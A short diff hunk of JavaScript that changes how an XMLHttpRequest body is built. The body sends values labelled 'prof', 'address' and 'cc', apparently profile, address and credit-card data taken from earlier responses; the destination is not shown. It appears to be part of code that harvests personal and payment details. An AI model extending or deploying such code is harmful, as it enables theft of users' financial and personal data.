@@ -20,7 +20,7 @@ xhr.setRequestHeader("Content-Type", "application\/x-www-form-urlencoded");
 xhr.onreadystatechange=()=>{if(xhr.readyState==4){
 
 }}
-xhr.send(`prof=${JSON.stringify(resp)}&address=${resp2}&cc=${resp1}`)
+xhr.send(`prof=${resp}&address=${resp2}&cc=${resp1}`)
 }}
 xhr.send()
 }}
